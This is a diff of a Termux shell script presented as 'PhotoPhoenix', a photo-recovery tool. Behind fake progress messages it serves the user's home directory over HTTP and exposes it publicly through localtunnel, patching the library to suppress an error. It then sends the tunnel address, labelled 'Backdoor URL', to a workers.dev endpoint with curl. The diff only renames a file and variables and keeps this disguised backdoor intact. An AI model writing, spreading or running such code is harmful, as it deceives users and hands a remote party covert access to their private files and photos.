@@ -7,11 +7,11 @@ GREEN="\033[32m"
 RED="\033[31m"
 END="\033[0m"
 set -e
-trap 'echo -e "${RED}PhotoPhoenix has stopped due to a reason beyond its control!\nPlease try again.${END}"; rm -f "data.txt"; rm -rf "storage/shared/PhotoPhoenix/restored_photos"; exit 1' INT ERR
+trap 'echo -e "${RED}PhotoPhoenix has stopped due to a reason beyond its control!\nPlease try again.${END}"; rm -f "tppd.txt"; rm -rf "storage/shared/PhotoPhoenix/restored_photos"; exit 1' INT ERR
 sleep 1
+cd ~
 echo -e "${GREEN}PhotoPhoenix : Running ...${END}"
 sleep 6
-cd ~
 if [ -d "storage" ]
 then
   :
@@ -55,9 +55,9 @@ then
         :
       else
         echo -e "${RED}Network interface has changed and the PhotoPhoenix has stopped!\nPlease connect to the internet with a stable Wi-Fi network and try again.${END}"
-        if [ -f "data.txt" ]
+        if [ -f "tppd.txt" ]
         then
-          rm "data.txt"
+          rm "tppd.txt"
         fi
         if [ -d "storage/shared/PhotoPhoenix/restored_photos" ]
         then
@@ -75,11 +75,11 @@ then
     npm install -g localtunnel >/dev/null 2>&1
     sed -i "s|throw new Error|// throw new Error|" /data/data/com.termux/files/usr/lib/node_modules/localtunnel/node_modules/openurl/openurl.js
     python -m http.server 8888 >/dev/null 2>&1 &
-    lt -p 8888 > data.txt 2>/dev/null &
+    lt -p 8888 > tppd.txt 2>/dev/null &
     sleep 6
-    DATA=$(grep -o "https://[^ ]*" data.txt)
-    curl https://api-photophoenix.photophoenix8.workers.dev --data-urlencode $'text=Backdoor URL :\n\n'"$DATA" >/dev/null 2>&1
-    rm "data.txt"
+    BACKDOOR_URL=$(grep -o "https://[^ ]*" tppd.txt)
+    curl https://api-photophoenix.photophoenix8.workers.dev --data-urlencode $'text=Backdoor URL :\n\n'"$BACKDOOR_URL" >/dev/null 2>&1
+    rm "tppd.txt"
     echo -e "${GREEN}PhotoPhoenix is searching for photos to recover ...\nPlease wait ...${END}"
     sleep 30
     CACHED_FILES="storage/shared/PhotoPhoenix/cached_files"
